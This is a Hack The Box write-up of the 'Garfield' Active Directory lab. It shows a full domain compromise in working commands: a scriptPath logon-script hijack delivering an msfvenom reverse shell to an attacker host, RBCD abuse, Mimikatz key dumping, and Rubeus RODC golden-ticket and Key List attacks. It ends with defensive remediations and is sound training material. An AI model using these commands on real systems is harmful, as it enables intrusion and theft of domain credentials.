---
title: Garfield
os: Windows
difficulty: Hard
tags:
  - Active Directory
  - SYSVOL Logon Script
  - bloodyAD
  - RBCD
  - RODC
  - Key List Attack
  - Mimikatz
  - Rubeus
  - Privilege Escalation
---

# 🛡️ HTB - Garfield (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Garfield
- **Operating System:** Windows Server 2019
- **Difficulty:** Hard
- **Vulnerabilities:** Insecure scriptPath Write Permissions, Active Directory ACL Abuse (ForceChangePassword / addSelf), Resource-Based Constrained Delegation (RBCD), RODC Key List Attack

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.16.212
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-05 14:13 UTC
Nmap scan report for 10.129.16.212
Host is up (0.26s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-05 22:12:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T22:13:25+00:00
```

- 🔍 *We are targeting an Active Directory environment. We have been provided with initial entry credentials:* `j.arbuckle / Th1sD4mnC4t!@1978`
- 🔍 *Verifying the credentials against the Domain Controller via SMB:*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
```

```text
SMB         10.129.16.212   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb)
SMB         10.129.16.212   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
```

- 🔍 *Listing domain user accounts using NetExec:*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

```text
SMB         10.129.16.212   445    DC01             j.arbuckle                    2025-09-09 15:50:55 0
SMB         10.129.16.212   445    DC01             l.wilson                      2026-01-27 21:40:33 0
SMB         10.129.16.212   445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0
```

- 🔍 *Listing available SMB shares:*

```bash
nxc smb 10.129.16.212 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```

```text
SMB         10.129.16.212   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.16.212   445    DC01             C$                              Default share
SMB         10.129.16.212   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.16.212   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.16.212   445    DC01             SYSVOL          READ            Logon server share
```

- 🔍 *Checking the SYSVOL share contents:*

```bash
smbclient //10.129.16.212/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
```

```text
\garfield.htb\scripts
  .                                   D        0  Tue Jan 27 22:13:47 2026
  ..                                  D        0  Tue Jan 27 22:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 22:20:29 2025
```

- 🔍 *We see a logon script `printerDetect.bat` in the scripts folder. Standard users have read access to it.*

---

## Step 2 - Enumeration

- 🔍 *Checking Active Directory permissions using `bloodyAD` to see if our user has write privileges over any objects:*

```bash
bloodyAD --host DC01.garfield.htb \
   -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
   get writable --detail
```

```text
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

> [!IMPORTANT]
> **logonScript Hijacking Vulnerability:**
> Our low-privileged user `j.arbuckle` has write access to the `scriptPath` attribute of the user objects `l.wilson` and `l.wilson_adm`. This attribute defines which script runs automatically in the user's context upon domain logon. By altering this to point to a custom batch script stored inside the globally readable SYSVOL share, we can achieve code execution under their context.

---

## Step 3 - Initial Foothold

- 🔍 *We generate a PowerShell command wrapper using msfvenom to establish a reverse TCP shell:*

```bash
printf '@echo off\r\n%s\r\n' \
   "$(msfvenom -p windows/x64/meterpreter/reverse_tcp \
   LHOST=10.10.15.8 LPORT=443 \
   -f psh-cmd | tail -n 1)" \
> log-check.bat
```

- 🔍 *Set up the Metasploit listener on the attacker machine:*

```bash
sudo msfconsole -q \
   -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; run"
```

- 🔍 *Upload the malicious batch script to the SYSVOL share:*

```bash
smbclient //garfield.htb/SYSVOL \
   -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
   -c 'cd garfield.htb\scripts; put log-check.bat log-check.bat'
```

- 🔍 *Update `l.wilson`'s `scriptPath` attribute using `bloodyAD` to execute our script:*

```bash
bloodyAD --host DC01.garfield.htb \
   -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
   set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
   scriptPath \
   -v log-check.bat
```

```text
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

- 🔍 *Once `l.wilson` authenticates on the domain, the script triggers our listener:*

```text
[*] Meterpreter session 1 opened (10.10.15.8:443 -> 10.129.17.250:61591)
meterpreter > shell
C:\Windows>whoami
garfield\l.wilson
```

- 🔍 *Foothold established. Running Active Directory ACL queries, we find that `l.wilson` has `ForceChangePassword` permissions over `l.wilson_adm`.*
- 🔍 *Resetting `l.wilson_adm`'s password:*

```powershell
$pw = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity 'l.wilson_adm' -Reset -NewPassword $pw
```

- 🔍 *Verifying WinRM access for the updated `l.wilson_adm` account:*

```bash
nxc winrm 10.129.31.77 -u l.wilson_adm -p 'NewPassword123!' -d garfield.htb
```

```text
WINRM       10.129.31.77    5985   DC01             [+] garfield.htb\l.wilson_adm:NewPassword123! (Pwn3d!)
```

- 🔍 *Establish a WinRM shell using `evil-winrm`:*

```bash
evil-winrm -i 10.129.31.77  -u 'l.wilson_adm' -p 'NewPassword123!'
```

---

## Step 4 - Privilege Escalation

- 🔍 *Analyzing domain settings on our WinRM shell, we discover a local subnet:*

```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address: 192.168.100.1
Ethernet adapter Ethernet0 3:
   IPv4 Address: 10.129.31.77
```

- 🔍 *Scanning the internal network subnet using `fscan.exe`:*

```text
[*] NetBios 192.168.100.2   [+] DC:GARFIELD\RODC01
```

- 🔍 *We identify an internal host: `RODC01` (192.168.100.2). This is a Read-Only Domain Controller.*
- 🔍 *We establish a Chisel proxy tunnel to interact with the internal subnet:*
  - Attacker: `./chisel-lin server --reverse --port 8080 --socks5`
  - WinRM: `.\chisel.exe client 10.10.15.8:8080 R:socks`
- 🔍 *Connecting to the internal RODC01 via WinRM using our credentials:*

```bash
proxychains4 evil-winrm -i 192.168.100.2 -u 'l.wilson_adm' -p 'NewPassword123!'
```

- 🔍 *Checking the Password Replication Policy (PRP) on RODC01:*

```powershell
Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Allowed
Get-ADDomainControllerPasswordReplicationPolicy -Identity "RODC01" -Denied
```

```text
Denied: CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
Denied: CN=Administrators,CN=Builtin,DC=garfield,DC=htb
```

- 🔍 *Because `CN=Administrators` is explicitly in the denied list, standard privilege delegation fails.*
- 🔍 *Our compromised user `l.wilson_adm` is a member of `Tier1.garfield.htb` which has `addSelf` permissions over the `RODC Administrators` group. We add ourselves to `RODC Administrators`:*

```bash
proxychains bloodyAD -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' --host 192.168.100.1 add groupMember "RODC Administrators" "l.wilson_adm"
```

> [!NOTE]
> **Exploitation Path (RBCD & Key List Attack):**
> 1. **Resource-Based Constrained Delegation (RBCD):** As RODC Administrators, we have `WriteAccountRestrictions` privileges on `RODC01$`. We register a fake computer object and modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `RODC01$` to point to it, enabling us to impersonate the Domain Administrator on `RODC01`.
> 2. **Dumping RODC Signing Key:** Once we gain administrative control of `RODC01`, we dump its local KDC signing key (`krbtgt_8245`).
> 3. **Modifying Password Replication Policy:** We remove `Administrator` from the Denied list and add it to the Allowed reveal list on `RODC01$`.
> 4. **Key List Attack:** We forge an RODC Golden Ticket for `Administrator` using the signing key and present it to the primary Domain Controller (`DC01`). DC01 treats it as a legitimate sync request from the trusted RODC and reveals the real domain administrator's password hashes.

- 🔍 *Registering a fake computer object in AD:*

```bash
proxychains impacket-addcomputer garfield.htb/l.wilson_adm:'NewPassword123!' -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip 192.168.100.1
```

- 🔍 *Writing the delegation attributes for the computer object (RBCD):*

```bash
proxychains impacket-rbcd garfield.htb/l.wilson_adm:'NewPassword123!' -dc-ip 192.168.100.1 -action write -delegate-to 'RODC01$' -delegate-from 'FAKEBOX$'
```

- 🔍 *Requesting an impersonation token for the Administrator user:*

```bash
proxychains impacket-getST garfield.htb/FAKEBOX$:'FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 192.168.100.1
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

- 🔍 *Executing WMIexec as Administrator on RODC01:*

```bash
proxychains impacket-wmiexec -k -no-pass garfield.htb/Administrator@RODC01.garfield.htb
```

- 🔍 *Using Mimikatz on the compromised RODC to extract the RODC's Kerberos signing key:*

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

```text
aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

- 🔍 *We modify the RODC's replication list to allow caching the `Administrator` password:*

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

- 🔍 *We empty the denied list of the RODC object:*

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-NeverRevealGroup
```

- 🔍 *We forge an RODC Golden Ticket for `Administrator` using Rubeus:*

```powershell
.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
```

- 🔍 *Presenting the forged ticket to DC01 to trigger a Key List replication sync request:*

```powershell
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:administrator.kirbi /nowrap
```

```text
  Base64(key)              :  QqrxnGt5pZWBmk35nSRdIHqrufjOo56E6W64DShxZDo=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

- 🔍 *We successfully retrieve the domain administrator password hash:* `EE238F6DEBC752010428F20875B092D5`
- 🔍 *Converting the ticket to CCache format and executing impacket-secretsdump to harvest all domain hashes:*

```bash
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
proxychains impacket-secretsdump -k -no-pass DC01.garfield.htb
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
```

- 🔍 *Establishing a WinRM session as Domain Administrator on the primary Domain Controller (DC01):*

```bash
evil-winrm -i 10.129.39.117 -u 'Administrator' -p 'lgoSWZnv0phWaNFu'
```

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Garfield lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Permissive AD Object Write Permissions (scriptPath)

> [!WARNING]
> **Vulnerability Profile:**
> Low-privileged domain accounts possess write permissions (`WRITE`) over critical user attributes (`scriptPath`, `profilePath`) of other users.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Allowing users to edit attributes that determine executable paths executed during session initialization is equivalent to arbitrary code execution. Attacking forces can assign custom payloads pointing to remote shares (SYSVOL, netlogon) to trigger reverse shell executions during normal logins.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Revoke permission rights of unprivileged users to modify attributes on other user objects. Restrict `scriptPath` edits strictly to Domain Administrators.
> - **Remediation:** Enforce strict file system access constraints over shared logon scripts in SYSVOL, preventing non-administrative users from modifying or writing batch files.
> - **Detection:** Audit Active Directory directories for changes to object attributes using tools like BloodHound or monitoring Event ID 5136 (A directory service object was modified).

---

### 🔴 Resource-Based Constrained Delegation (RBCD) Abuse

> [!WARNING]
> **Vulnerability Profile:**
> The domain's computer accounts permit delegated administrators (`RODC Administrators`) to write `msDS-AllowedToActOnBehalfOfOtherIdentity` configurations, defining arbitrary computer objects as trusted delegates.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Once an attacker controls the RBCD delegation attributes of a target computer account, they can request Kerberos service tickets impersonating any high-privileged domain accounts (e.g. Domain Administrator) to gain root access on the machine.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable standard users from registering new machine accounts by setting the domain-wide `MachineAccountQuota` to `0`.
> - **Remediation:** Strictly limit write access rights on computer object delegation properties to Domain Admins.
> - **Detection:** Alert on any updates modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer objects.

---

### 🔴 RODC Password Replication Policy (PRP) Misconfiguration & Key List Attacks

> [!WARNING]
> **Vulnerability Profile:**
> Highly privileged domain accounts (Domain Administrators) are allowed to be added to the Allowed RODC Password Replication Group (`msDS-RevealOnDemandGroup`) or removed from the Denied Replication Group (`msDS-NeverRevealGroup`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If an RODC's Kerberos signing key is compromised, attackers can forge Golden Tickets mimicking the RODC. If high-privileged accounts are added to the Allowed PRP list, the attacker can execute a Key List Attack to query the primary Domain Controller for the real Domain Administrator's password hashes, resulting in complete domain compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Guarantee that critical domain administrative groups (Domain Admins, Enterprise Admins, Schema Admins) are explicitly placed in the Denied RODC Password Replication Group.
> - **Remediation:** Apply rigid access rules restricting modifications of RODC replication groups.
> - **Detection:** Monitor Event ID 4692 (attempts to backup DPAPI master keys) and inspect domain controllers for anomalous KDC request sequences matching Key List replication patterns.
